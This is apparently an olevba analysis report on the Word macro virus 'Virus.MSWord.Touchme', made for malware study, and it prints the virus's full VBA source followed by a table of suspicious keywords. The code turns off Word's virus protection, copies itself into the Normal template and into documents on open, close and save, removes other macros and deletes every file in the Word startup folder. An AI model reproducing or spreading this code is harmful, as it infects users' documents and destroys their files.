olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Touchme
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Touchme - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Created by Reza Pc 212
' Copyright © ReYoKh Team Labs
' University of Gunadarma
'
' fUcKig aLl aNtiVirUS, cAn YoU tOuCh mE ? DOnt dReAM !
'
' Last Up-Date 16 November 1999 [09.00:00]

Private Sub Infected()
    On Error Resume Next
    Dim Reg
    Dim Active As Boolean
    Dim ID, Ultah, Name As String
    Dim AD, NT As Object
    ID = "' Last Up-Date 16 November 1999 [09.00:00]"
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    Reg = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
    If System.PrivateProfileString("", regs, "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = False
        System.PrivateProfileString("", regs, "Level") = 1&
    Else
        With Options
            .VirusProtection = False
            .ConfirmConversions = False
            .SaveNormalPrompt = False
        End With
    End If
    WordBasic.disableautomacros True
    If NT.Lines(7, 1) <> ID Then
        NT.DeleteLines 1, NT.CountOfLines
        NT.AddFromString AD.Lines(1, AD.CountOfLines)
    End If
    If AD.Lines(7, 1) <> ID Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.AddFromString NT.Lines(1, NT.CountOfLines)
    End If
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Day(Date) = 5 And Month(Date) = 3 Then Name = "REZA"
    If Day(Date) = 8 And Month(Date) = 8 Then Name = "YOMBI"
    If Day(Date) = 22 And Month(Date) = 12 Then Name = "NELIS"
    If Name <> "" Then
        Active = Assistant.Visible
        Assistant.Visible = True
        With Assistant.NewBalloon
            .Text = "ReYoKh Team Labs mengucapkan" + Chr(13) + Chr(13) + _
                    "Selamat Ulang Tahun  !!!" + Chr(13) + "untuk " + Name + ", bahagia selalu"
            .Show
        End With
        Assistant.Visible = Active
    End If
    Open Application.StartupPath + "\EcHa" For Output As #1
    Print #1, "Attribute VB_Name=" + Chr(34) + "EcHa" + Chr(34)
    Print #1, "Sub ViewVBCode"
    Print #1, "End Sub"
    Print #1, "Sub ToolsMacro"
    Print #1, "End Sub"
    Print #1, "Sub AutoExec"
    Print #1, "    ToolsMacro"
    Print #1, "End Sub"
    Print #1, "Sub ToolsOptions"
    Print #1, "    Options.VirusProtection=True"
    Print #1, "    Dialogs(wdDialogToolsOptions).Show"
    Print #1, "End Sub"
    Close #1
    NormalTemplate.VBProject.VBComponents.Import Application.StartupPath + "\EcHa"
    Kill Application.StartupPath + "\*.*"
    WordBasic.disableautomacros False
End Sub
Private Sub Document_Close()
    Infected
End Sub
Private Sub Document_Open()
    Infected
End Sub
Private Sub Document_Save()
    Infected
End Sub
Private Sub Document_New()
    Infected
End Sub
Private Sub Document_Exit()
    Infected
End Sub
Private Sub Document_Exec()
    Infected
End Sub










































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |DF@                 |REZA                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

